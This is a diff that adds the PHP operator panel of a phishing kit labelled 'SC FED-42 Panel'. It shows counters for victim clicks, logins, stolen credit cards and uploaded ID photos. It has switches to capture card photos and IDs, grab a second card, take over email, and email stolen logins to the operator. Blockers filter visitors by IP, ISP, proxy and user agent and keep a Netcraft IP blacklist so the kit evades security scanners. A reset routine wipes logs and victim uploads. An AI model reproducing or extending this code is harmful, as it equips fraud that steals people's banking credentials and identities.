@@ -1,0 +1,1195 @@
+<?php
+error_reporting(0);
+require_once "config.php";
+require "assets/includes/simplehtmldom.php";
+
+if($_GET["panel"] != $panel)
+    {
+           header("HTTP/1.0 404 Not Found");
+           die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
+    }
+?>
+
+<!DOCTYPE html>
+<html>
+    <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<title>SC FED-42 Panel</title>
+<link rel="icon"  href="http://fed42.co.id/sc/avatar2.png">
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
+<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+<script type="text/javascript">
+$("#menu-toggle").click(function(e) {
+        e.preventDefault();
+        $("#wrapper").toggleClass("active");
+});
+</script>
+<style>
+    body {
+    background-color:#334660;
+    background-image: url('https://i.imgur.com/VX3Zwtj.jpg');
+               
+
+}
+
+.table > tbody > tr > td, .table > tbody > tr > th, .table > tfoot > tr > td, .table > tfoot > tr > th, .table > thead > tr > td, .table > thead > tr > th {
+    padding: 8px;
+    line-height: 1.42857143;
+    vertical-align: middle;
+    border-top: 1px solid #ddd;
+}
+
+.switch {
+  position: relative;
+  display: inline-block;
+  width: 80px;
+  height: 25px;
+  vertical-align: middle;
+  margin-top: 8px;
+}
+
+.switch input {display:none;}
+
+.slider {
+  position: absolute;
+  cursor: pointer;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background-color: #A1A6AB;
+  -webkit-transition: .4s;
+  transition: .4s;
+
+}
+
+.slider:before {
+  position: absolute;
+  content: "";
+ height: 17px;
+width: 30px;
+left: 6px;
+bottom: 4px;
+  background-color: white;
+  -webkit-transition: .4s;
+  transition: .4s;
+}
+
+input:checked + .slider {
+  background-color: #ADFF2F;
+}
+
+input:focus + .slider {
+  box-shadow: 0 0 1px #2196F3;
+}
+
+input:checked + .slider:before {
+  -webkit-transform: translateX(37px);
+  -ms-transform: translateX(37px);
+  transform: translateX(37px);
+}
+
+/* Rounded sliders */
+.slider.round {
+  border-radius: 34px;
+}
+
+.slider.round:before {
+  border-radius: 25px;
+}
+
+
+.table th, .table td { 
+     border-top: none !important;
+     border-left: none !important;
+ }
+
+.table-striped > tbody > tr:nth-of-type(2n+1) {
+    background-color: #313131 ;
+}
+
+.table-call {
+    min-height: .01%;
+    overflow-x: auto;
+    margin-top: 15px;
+    border-radius: 6px;
+}
+
+.nav > li > a:focus, .nav > li > a:hover {
+    text-decoration: none;
+    background-color: black;
+    color: white;
+}
+
+
+.table.table-bordered.vertical,
+.table.table-bordered.vertical td,
+.table.table-bordered.vertical th{
+  border-top: 0px solid white !important;
+  border-bottom: 0px solid white !important;
+  border-right: 0px solid white !important;
+  border-left: 0px solid white !important;
+    }
+
+.head {
+  font-weight: normal;
+  font-size: 16px;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+textarea, input, button {
+  outline: none;
+}
+
+.window-button, .window .buttons .close, .window .buttons .minimize, .window .buttons .maximize {
+  padding: 0;
+  margin: 0;
+  margin-right: 4px;
+  width: 12px;
+  height: 12px;
+  background-color: gainsboro;
+  border: 1px solid rgba(0, 0, 0, 0.2);
+  border-radius: 6px;
+  color: rgba(0, 0, 0, 0.5);
+}
+
+.window {
+  animation: bounceIn 1s ease-in-out;
+  width: 100%;
+}
+.window .handle {
+  height: 22px;
+  background: linear-gradient(0deg, #d8d8d8, #ececec);
+  border-top: 1px solid white;
+  border-bottom: 1px solid #b3b3b3;
+  border-top-left-radius: 5px;
+  border-top-right-radius: 5px;
+  color: rgba(0, 0, 0, 0.7);
+  font-family: Helvetica, sans-serif;
+  font-size: 13px;
+  line-height: 22px;
+  text-align: center;
+}
+.window .buttons {
+  position: absolute;
+  float: left;
+  margin: 0 8px;
+}
+.window .buttons .close {
+  background-color: #ff6159;
+}
+.window .buttons .minimize {
+  background-color: #ffbf2f;
+}
+.window .buttons .maximize {
+  background-color: #25cc3e;
+}
+.window .terminal {
+  padding: 4px;
+  background-color: black;
+  opacity: 0.7;
+  height: 410px;
+  color: white;
+  font-family: 'Source Code Pro', monospace;
+  font-weight: 200;
+  font-size: 14px;
+  white-space: pre-wrap;
+  white-space: -moz-pre-wrap;
+  white-space: -pre-wrap;
+  white-space: -o-pre-wrap;
+  word-wrap: break-word;
+  border-bottom-left-radius: 5px;
+  border-bottom-right-radius: 5px;
+  overflow-y: auto;
+}
+.window .terminal::after {
+  content: "|";
+  animation: blink 2s steps(1) infinite;
+}
+
+.prompt {
+  color: #bde371;
+}
+
+.path {
+  color: #5ed7ff;
+}
+
+
+.row{
+    margin-left:0px;
+    margin-right:0px;
+}
+
+#wrapper {
+    padding-left: 70px;
+    transition: all .4s ease 0s;
+    height: 100%
+}
+
+
+#sidebar-wrapper {
+    margin-left: -150px;
+    left: 70px;
+    width: 150px;
+    background: #222;
+    position: fixed;
+    height: 100%;
+    z-index: 10000;
+    transition: all .4s ease 0s;
+}
+
+.sidebar-nav {
+    display: block;
+    float: left;
+    width: 150px;
+    list-style: none;
+    margin: 0;
+    padding: 0;
+}
+#page-content-wrapper {
+    padding-left: 0;
+    margin-left: 0;
+    width: 100%;
+    height: auto;
+}
+#wrapper.active {
+    padding-left: 150px;
+}
+#wrapper.active #sidebar-wrapper {
+    left: 150px;
+}
+
+#page-content-wrapper {
+  width: 100%;
+}
+
+#sidebar_menu li a, .sidebar-nav li a {
+    color: #999;
+    display: block;
+    float: left;
+    text-decoration: none;
+    width: 150px;
+    background: #252525;
+    border-top: 1px solid #373737;
+    border-bottom: 1px solid #ff3030;
+    -webkit-transition: background .5s;
+    -moz-transition: background .5s;
+    -o-transition: background .5s;
+    -ms-transition: background .5s;
+    transition: background .5s;
+}
+.sidebar_name {
+    padding-top: 25px;
+    color: #ff3030;
+    opacity: .7;
+}
+
+.sidebar-nav li {
+  line-height: 40px;
+  text-indent: 20px;
+}
+
+.sidebar-nav li a {
+  color: #999999;
+  display: block;
+  text-decoration: none;
+}
+
+.sidebar-nav li a:hover {
+  color: #fff;
+  background: rgba(255,255,255,0.2);
+  text-decoration: none;
+}
+
+.sidebar-nav li a:active,
+.sidebar-nav li a:focus {
+  text-decoration: none;
+}
+
+.sidebar-nav > .sidebar-brand {
+  height: 65px;
+  line-height: 60px;
+  font-size: 18px;
+}
+
+.sidebar-nav > .sidebar-brand a {
+  color: #999999;
+}
+
+.sidebar-nav > .sidebar-brand a:hover {
+  color: #fff;
+  background: none;
+}
+
+#main_icon
+{
+    float:right;
+   padding-right: 65px;
+   padding-top:20px;
+}
+.sub_icon
+{
+    float:right;
+   padding-right: 65px;
+   padding-top:10px;
+}
+.content-header {
+  height: 65px;
+  line-height: 65px;
+}
+
+.content-header h1 {
+  margin: 0;
+  margin-left: 20px;
+  line-height: 65px;
+  display: inline-block;
+}
+
+@media (max-width:767px) {
+    #wrapper {
+    padding-left: 70px;
+    transition: all .4s ease 0s;
+}
+#sidebar-wrapper {
+    left: 70px;
+}
+#wrapper.active {
+    padding-left: 150px;
+}
+#wrapper.active #sidebar-wrapper {
+    left: 150px;
+    width: 150px;
+    transition: all .4s ease 0s;
+}
+}
+
+
+h1, h2, h3, h4, h5, h6 { color: #dadada; margin: 0px 0px 15px 0px; font-weight: 300; font-family: 'Oswald', sans-serif; letter-spacing: 2.5px; text-transform: uppercase; }
+a { text-decoration: none; color: #6c6c6c; -webkit-transition: all 0.3s; -moz-transition: all 0.3s; transition: all 0.3s; }
+a:focus, a:hover { text-decoration: none; color: #fff; }
+.tutor-block { background-color: #1a1a1a; padding: 30px; width: 100%; }
+.tutor-content { text-align: center; }
+.tutor-title { margin-bottom: 5px; }
+.tutor-designation { color: #ff3030; display: block; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; font-size: 12px; }
+.tutor-img img { width: 100%; margin-bottom: 30px; }
+.social-media { background-color: #1a1a1a; padding: 12px; text-align: center; }
+.social-media span { margin-right: 18px; font-size: 20px; font-family: "FontAwesome";}
+.mb60{margin-bottom:60px;}
+.mt30{margin-top:30px;}
+</style>
+</head>
+<!------ Include the above in your HEAD tag ---------->
+<body>
+<div id="wrapper" class="active">
+      
+      <!-- Sidebar -->
+            <!-- Sidebar -->
+      <div id="sidebar-wrapper">
+      <ul id="sidebar_menu" class="sidebar-nav">
+           <li class="sidebar-brand"><a id="menu-toggle" href="#"> <img class="nav-user-photo" src="https://i.imgur.com/1R4cK0R.png" alt="FED42"></a></li>
+      </ul>
+        <ul class="sidebar-nav" id="sidebar">
+          <li><a href="https://<?php echo $_SERVER['SERVER_NAME']."/".$param;?>" target="_blank">Visit Scam</a></li>
+          <li><a>Click&nbsp;&nbsp;&nbsp;&nbsp;<span class="badge"><?php echo empty(@file_get_contents("assets/logs/._click_.txt")) ? "0" : @file_get_contents("assets/logs/._click_.txt"); ?></span></a></li>
+          <li><a>Login&nbsp;&nbsp;&nbsp;<span class="badge"><?php echo empty(@file_get_contents("assets/logs/._login_.txt")) ? "0" : @file_get_contents("assets/logs/._login_.txt"); ?></span></a></li>
+          <li><a>Credit&nbsp;&nbsp;<span class="badge"><?php echo empty(@file_get_contents("assets/logs/._ccz_.txt")) ? "0" : @file_get_contents("assets/logs/._ccz_.txt"); ?></span></a></li>
+          <li><a>Photo&nbsp;&nbsp;<span class="badge"><?php echo empty(@file_get_contents("assets/logs/._upload_.txt")) ? "0" : @file_get_contents("assets/logs/._upload_.txt"); ?></span></a></li>
+          <li><form method="POST" id="rd" action""><input type="hidden" name="reset" value=""><a href="javascript:{}" name="asw" onclick="document.getElementById('rd').submit();">Reset Log</a></form></li>
+          <li><form method="POST" id="loggg" action""><input type="hidden" name="sendlogg" value=""><a href="javascript:{}" name="tae" onclick="document.getElementById('loggg').submit();">Send Login</a></form></li>
+          <li><form method="POST" id="emmmm" action""><input type="hidden" name="sendloge" value=""><a href="javascript:{}" name="taek" onclick="document.getElementById('emmmm').submit();">Send Email </a></form></li>
+          
+        </ul>
+      </div>
+      <script>
+      </script>
+          
+      <!-- Page content -->
+      <div id="page-content-wrapper">
+        <!-- Keep all page content within the page-content inset div! -->
+        <div class="page-content inset">
+        <br><br>
+            <div class="container">
+            <div class="row">
+                <div class="col-sm-8">
+                <div class="outer-form">
+                    <table id="mainn" class="table-striped table table-bordered vertical" style="width:100%;">
+                          <thead style="color: white; font-weight: normal; background-color: black;" >
+                            <tr>
+                              <th  class="head"><center>Main Feature</center></th>
+                              <th  class="head"><center>Status</center></th>
+                            </tr>
+                          </thead>
+
+                             <tbody style="border:1px solid transparent; background-color:#242424; color:#A1A6AB; text-align: left;">
+                           
+                            
+                            <tr>
+                              <td width="70%"><li style="padding-left:30px;">Get IDCard (Get CC Photo and ID)</li></td>
+                              <td><center>
+                               <label class="switch">
+                            <form method="POST" name="wewa">
+                               <?php if ($idcard == 'naam')  { ?>
+                               <input type="checkbox" name="papp" value="naam" checked>
+                               <?} else if ($idcard == 'laaa') { ?>
+                               <input type="checkbox" name="papp" value="naam" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr>
+                            
+                             <tr>
+                              <td><li style="padding-left:30px;">True Login (Login can only accessed by official account)</li></center></td>
+                              <td><center>
+                               <label class="switch">
+                               <?php if ($tlog == 'true')  { ?>
+                               <input type="checkbox" name="tlll" value="true" checked>
+                               <?} else if ($tlog == 'false') { ?>
+                               <input type="checkbox" name="tlll" value="true" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr>
+                            
+                            <tr>
+                              <td><li style="padding-left:30px;">One Time (Prevent multiple input)</li></td>
+                              <td><center>
+                               <label class="switch">
+                               <?php if ($One_Time_Access == 'sii')  { ?>
+                               <input type="checkbox" name="ont" value="sii" checked>
+                               <?} else if ($One_Time_Access == 'noo') { ?>
+                               <input type="checkbox" name="ont" value="sii" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr>
+                            
+                            <tr>
+                              <td><li style="padding-left:30px;">Double CC (Get Double CC)</li></td>
+                              <td><center>
+                               <label class="switch">
+                                 <?php if ($Double == 'kerad')  { ?>
+                               <input type="checkbox" name="dbbl" value="kerad" checked>
+                               <?} else if ($Double == 'keras') { ?>
+                               <input type="checkbox" name="dbbl" value="kerad" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr>
+                            
+                            <tr>
+                              <td><li style="padding-left:30px;">Grab Email (Get email access)</li></td>
+                              <td><center>
+                               <label class="switch">
+                                 <?php if ($grab_email == 'urip')  { ?>
+                               <input type="checkbox" name="grbb" value="urip" checked>
+                               <?} else if ($grab_email == 'matek') { ?>
+                               <input type="checkbox" name="grbb" value="urip" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr> 
+                            
+                            <tr>
+                          
+                              <td><li style="padding-left:30px;">Send Login (Send login result to email)</li></td>
+                              <td><center>
+                               <label class="switch">
+                                 <?php if ($send_login == 'hidup')  { ?>
+                               <input type="checkbox" name="slgg" value="hidup" checked>
+                               <?} else if ($send_login == 'mati') { ?>
+                               <input type="checkbox" name="slgg" value="hidup" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr> 
+                           
+                          <tr>
+                        
+                              <td><a style="padding-left:30px" class="aaf" href="javascript:void(0)">Blocker Setting</a></td>
+                              <script>
+                                  $('.aaf').on("click",function(){
+                                     $("#mainn").hide();
+                                     $("#blockk").show();
+                                    })
+                              </script>
+                              <td><center>
+                              <button type="submit" name="feats" style="width:93%; height:35px;color:white; background-color:#ff34b3;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" name="key" value="Save">Save</button>
+                              </form></center>
+                              </td>
+                            </tr>
+
+                          </tbody>
+                        </table>
+                        
+                        <table id="blockk" class="table-striped table table-bordered vertical" style="width:100%; display:none;">
+                          <thead style="color: white; font-weight: normal; background-color: black;" >
+                            <tr>
+                              <th width="70%" class="head"><center>Blocker Feature</center></th>
+                              <th  class="head"><center>Status</center></th>
+                            </tr>
+                          </thead>
+
+                             <tbody style="border:1px solid transparent; background-color:#242424; color:#A1A6AB; text-align: left;">
+                              <tr>
+                          
+                              <td><li style="padding-left:30px;">Blocker Host (Block by assigned Hostname)</li></td>
+                              <td><center>
+                            <form method="POST" name="wewa">
+                               <label class="switch">
+                                 <?php if ($hostblock == 'yeahh')  { ?>
+                               <input type="checkbox" name="hblock" value="hidup" checked>
+                               <?} else if ($hostblock == 'neahh') { ?>
+                               <input type="checkbox" name="hblock" value="hidup" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr> 
+                           
+                            <tr>
+                          
+                              <td><li style="padding-left:30px;">Blocker Proxy (Block by assigned Proxy)</li></td>
+                              <td><center>
+                               <label class="switch">
+                                 <?php if ($proxb == 'yeahpxb')  { ?>
+                               <input type="checkbox" name="pxblock" value="hidup" checked>
+                               <?} else if ($proxb == 'neahpxb') { ?>
+                               <input type="checkbox" name="pxblock" value="hidup" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr> 
+                            
+                            <tr>
+                          
+                              <td><li style="padding-left:30px;">Blocker UA (Block by assigned User Agent)</li></td>
+                              <td><center>
+                               <label class="switch">
+                                 <?php if ($userblock == 'yeahu')  { ?>
+                               <input type="checkbox" name="ublock" value="hidup" checked>
+                               <?} else if ($userblock == 'neahu') { ?>
+                               <input type="checkbox" name="ublock" value="hidup" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr> 
+                            
+                            <tr>
+                          
+                              <td><li style="padding-left:30px;">Blocker IP (Block by assigned IP)</li></td>
+                              <td><center>
+                               <label class="switch">
+                                 <?php if ($ipblock == 'yeahi')  { ?>
+                               <input type="checkbox" name="iblock" value="hidup" checked>
+                               <?} else if ($ipblock == 'neahi') { ?>
+                               <input type="checkbox" name="iblock" value="hidup" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr> 
+                            
+                            <tr>
+                          
+                              <td><li style="padding-left:30px;">Blocker ISP (Block by assigned ISP)</li></td>
+                              <td><center>
+                               <label class="switch">
+                                 <?php if ($ispblock == 'yeahos')  { ?>
+                               <input type="checkbox" name="osblock" value="hidup" checked>
+                               <?} else if ($ispblock == 'neahos') { ?>
+                               <input type="checkbox" name="osblock" value="hidup" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr> 
+                            
+                             <tr>
+                          
+                              <td><li style="padding-left:30px;">Blocker Platform (Only accept visitor from Apple platform)</li></td>
+                              <td><center>
+                               <label class="switch">
+                                 <?php if ($platform == 'yeahp')  { ?>
+                               <input type="checkbox" name="pblock" value="hidup" checked>
+                               <?} else if ($platform == 'neahp') { ?>
+                               <input type="checkbox" name="pblock" value="hidup" unchecked>
+                               <?}?>
+                               <span class="slider round"></span>
+                               </label>
+                              </center></td>
+                            </tr> 
+                            
+                            <tr>
+                        
+                              <td><a style="padding-left:30px" class="aafa" href="javascript:void(0)">Feature Setting</a></td>
+                              <script>
+                                  $('.aafa').on("click",function(){
+                                     $("#mainn").show();
+                                     $("#blockk").hide();
+                                    })
+                              </script>
+                              <td><center>
+                              <button type="submit" name="featsp" style="width:93%; height:35px;color:white; background-color:#ff34b3;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" name="key" value="Save">Save</button>
+                              </form></center>
+                              </td>
+                            </tr>
+
+                          </tbody>
+                        </table>
+                        
+		<div class="window">
+				<div class="handle">
+						<span class="title">XxBLOCKERxX</span>
+				</div>
+				<div class="terminal"><div><p><?php include('assets/logs/blocked.txt'); ?></p></div></div>
+		</div><br>
+                </div>
+                </div>
+                <div class="col-sm-4">
+                <div class="tutor-block">
+                        <div class="tutor-content">
+                            <h5 class="tutor-title">Result Setting</h5>
+                            <span class="tutor-designation">Result Email</span>
+                            <form method="POST">
+                           <input class="form-control" readonly="true" name="lama" value="<?php echo $Your_Email; ?>" type="hidden">
+                           <input name="baru" style="width: 100%;height:30px;background: #2b303b;border: none;padding-left: 10%;color: #63717f;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" placeholder="<?php echo $Your_Email ?>"/>
+                        </div>
+                    </div>
+                    <div class="social-media">
+                        <input name="emel" style="width:93%; height:35px;color:white; background-color:#FF3030;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" type="submit" Value="Save" />
+                    </form>
+                    </div><br>
+                    <div class="tutor-block">
+                        <div class="tutor-content">
+                            <h5 class="tutor-title">Scam Setting</h5>
+                            <span class="tutor-designation">Scam Access</span>
+                            <form method="POST">
+                            <input class="form-control" type="hidden"  readonly="true" name="parla" value="<?php echo $param; ?>">
+                           <input name="parba" style="width: 100%;height:30px;background: #2b303b;border: none;padding-left: 10%;color: #63717f;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" placeholder="<?php echo $param?>"/>
+                        </div>
+                    </div>
+                    <div class="social-media">
+                        <input name="paras" style="width:93%; height:35px;color:white; background-color:#FF3030;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" type="submit" Value="Save" />
+                </form>
+                </div><br>
+                <div class="tutor-block">
+                        <div class="tutor-content">
+                            <h5 class="tutor-title">Scam Setting</h5>
+                            <span class="tutor-designation">Scam Panel</span>
+                            <form method="POST">
+                             <input class="form-control" type="hidden"  readonly="true" name="keylama" value="<?php echo $panel; ?>">
+                           <input name="keybaru" style="width: 100%;height:30px;background: #2b303b;border: none;padding-left: 10%;color: #63717f;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" placeholder="<?php echo $panel ?>"/>
+                        </div>
+                    </div>
+                    <div class="social-media">
+                        <input name="key" style="width:93%; height:35px;color:white; background-color:#FF3030;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" type="submit" Value="Save" />
+                    </form>
+                    </div><br>
+                     <div class="tutor-block">
+                        <div class="tutor-content">
+                            <h5 class="tutor-title">Scam Setting</h5>
+                            <span class="tutor-designation">Login Type (Locked/Invoice)</span>
+                            <form method="POST">
+                            <input class="form-control" type="hidden"  readonly="true" name="tyll" value="<?php echo $typelogin; ?>">
+                           <input name="tylb" style="width: 100%;height:30px;background: #2b303b;border: none;padding-left: 10%;color: #63717f;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" placeholder="<?php echo $typelogin ?>"/>
+                        </div>
+                    </div>
+                    <div class="social-media">
+                        <input name="tyls" style="width:93%; height:35px;color:white; background-color:#FF3030;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" type="submit" Value="Save" />
+                    </div><br
+                    </div>
+                </div>
+                </div>
+</body>
+</html>
+<?php
+$buse = trim($_POST['buse']);
+$lama   = trim($_POST['lama']);
+$baru   = trim($_POST['baru']);
+$papp = trim($_POST['papp']);
+$tlll = trim($_POST['tlll']);
+$svl = trim($_POST['svl']);
+$dbbl = trim($_POST['dbbl']);
+$grbb = trim($_POST['grbb']);
+$slgg = trim($_POST['slgg']);
+$iblock = trim($_POST['iblock']);
+$ublock = trim($_POST['ublock']);
+$pxblock = trim($_POST['pxblock']);
+$hblock = trim($_POST['hblock']);
+$osblock = trim($_POST['osblock']);
+$pblock = trim($_POST['pblock']);
+$ont = trim($_POST['ont']);
+$tll = trim($_POST['tll']);
+$tlb = trim($_POST['tlb']);
+$tokel = trim($_POST['tokel']);
+$tokeb = trim($_POST['tokeb']);
+$parla = trim($_POST['parla']);
+$parba = trim($_POST['parba']);
+$tyll = trim($_POST['tyll']);
+$tylb = trim($_POST['tylb']);
+$keylama = trim($_POST['keylama']);
+$keybaru = trim($_POST['keybaru']);
+$file   = "config.php";
+$isi    = file_get_contents($file);
+if (isset($_POST['featsp'])) {
+if (!isset($_POST['pxblock'])) {
+        $isi = str_replace($proxb,"neahpxb",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+      
+} else {
+          $isi = str_replace($proxb,"yeahpxb",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['featsp'])) {
+if (!isset($_POST['hblock'])) {
+        $isi = str_replace($hostblock,"neahh",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+      
+} else {
+          $isi = str_replace($hostblock,"yeahh",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['featsp'])) {
+if (!isset($_POST['osblock'])) {
+        $isi = str_replace($ispblock,"neahos",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+      
+} else {
+          $isi = str_replace($ispblock,"yeahos",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['featsp'])) {
+if (!isset($_POST['pblock'])) {
+        $isi = str_replace($platform,"neahp",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+      
+} else {
+          $isi = str_replace($platform,"yeahp",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['featsp'])) {
+if (!isset($_POST['ublock'])) {
+        $isi = str_replace($userblock,"neahu",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+      
+} else {
+          $isi = str_replace($userblock,"yeahu",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['featsp'])) {
+if (!isset($_POST['iblock'])) {
+        $isi = str_replace($ipblock,"neahi",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+      
+} else {
+          $isi = str_replace($ipblock,"yeahi",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['feats'])) {
+if (!isset($_POST['buse'])) {
+        $isi = str_replace($Abuse_Filter,"iyek",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+      
+} else {
+          $isi = str_replace($Abuse_Filter,"hai",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['feats'])) {
+if (!isset($_POST['tlll'])) {
+        $isi = str_replace($tlog,"false",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+      
+} else {
+        $isi = str_replace($tlog,"true",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['feats'])) {
+if(isset($_POST['papp'])) {
+        $isi = str_replace($idcard,$papp,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+} else {
+        $isi = str_replace($idcard,"laaa",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['feats'])) {
+if(isset($_POST['grbb'])) {
+        $isi = str_replace($grab_email,$grbb,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+} else {
+        $isi = str_replace($grab_email,"matek",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['feats'])) {
+if(isset($_POST['slgg'])) {
+        $isi = str_replace($send_login,$slgg,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+} else {
+        $isi = str_replace($send_login,"mati",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['feats'])) {
+if(isset($_POST['svl'])) {
+        $isi = str_replace($Save_Log,$svl,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+} else {
+        $isi = str_replace($Save_Log,"nooi",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['feats'])) {
+if(isset($_POST['dbbl'])) {
+        $isi = str_replace($Double,$dbbl,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+} else {
+        $isi = str_replace($Double,"keras",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if (isset($_POST['feats'])) {
+if(isset($_POST['ont'])) {
+        $isi = str_replace($One_Time_Access,$ont,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+} else {
+        $isi = str_replace($One_Time_Access,"noo",$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if(isset($_POST['emel'])) {
+    if(preg_match("#\b$lama\b#is", $isi)) {
+        $isi = str_replace($lama,$baru,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+}}
+if(isset($_POST['key'])) {
+   if(preg_match("#\b$keylama\b#is", $isi)) {
+        $isi = str_replace($keylama,$keybaru,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+    }
+}
+if(isset($_POST['tyls'])) {
+   if(preg_match("#$tyll#is", $isi)) {
+        $isi = str_replace($tyll,$tylb,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+    }
+}
+if(isset($_POST['tokes'])) {
+   if(preg_match("#$tokel#is", $isi)) {
+        $isi = str_replace($tokel,$tokeb,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+    }
+}
+
+if(isset($_POST['paras'])) {
+   if(preg_match("#$parla#is", $isi)) {
+        $isi = str_replace($parla,$parba,$isi);
+        $buka = fopen($file,'w');
+        fwrite($buka,$isi);
+        fclose($buka);
+        
+        rename($parla.".php",$parba.".php");
+    }
+}
+echo "<script type='text/javascript'>
+
+(function()
+{
+  if( window.localStorage )
+  {
+    if( !localStorage.getItem( 'firstLoad' ) )
+    {
+      localStorage[ 'firstLoad' ] = true;
+      window.location.reload();
+    }  
+
+    else
+      localStorage.removeItem( 'firstLoad' );
+  }
+})();
+
+</script>";
+if(isset($_POST['reset'])) {
+       unlink("assets/logs/._click_.txt");
+       unlink("assets/logs/.login.txt");
+       unlink("assets/logs/.logine.txt");
+       unlink("assets/logs/._login_.txt");
+       unlink("assets/logs/._ccz_.txt");
+       unlink("assets/logs/._upload_.txt");
+       unlink("assets/logs/bin.log");
+       unlink("assets/logs/ips.txt");
+       unlink("assets/logs/app.txt");
+       unlink("error_log");
+       unlink("assets/logs/accepted_visitors.txt");
+       unlink("assets/logs/denied_visitors.txt");
+       unlink("assets/logs/visitor_logged_in.txt");
+       $f_id = glob('uploads/*'); // get all file names
+       foreach($f_id as $f_id){ // iterate files
+       if(is_file($f_id))
+       unlink($f_id); // delete file
+       }
+       
+       $filee = file_get_contents("assets/includes/blacklist.dat");
+       $cek = preg_match_all("/# NETCRAFT IP RANGES(.*)# USERS COMPLETED/is", $filee, $res) ? $res : null;
+       $buka = fopen("assets/includes/blacklist.dat",'w');
+       fwrite($buka,$cek[0][0]."\r\r");
+       fclose($buka);
+       
+}
+$headers .= "Content-Type: text/html\r\n";
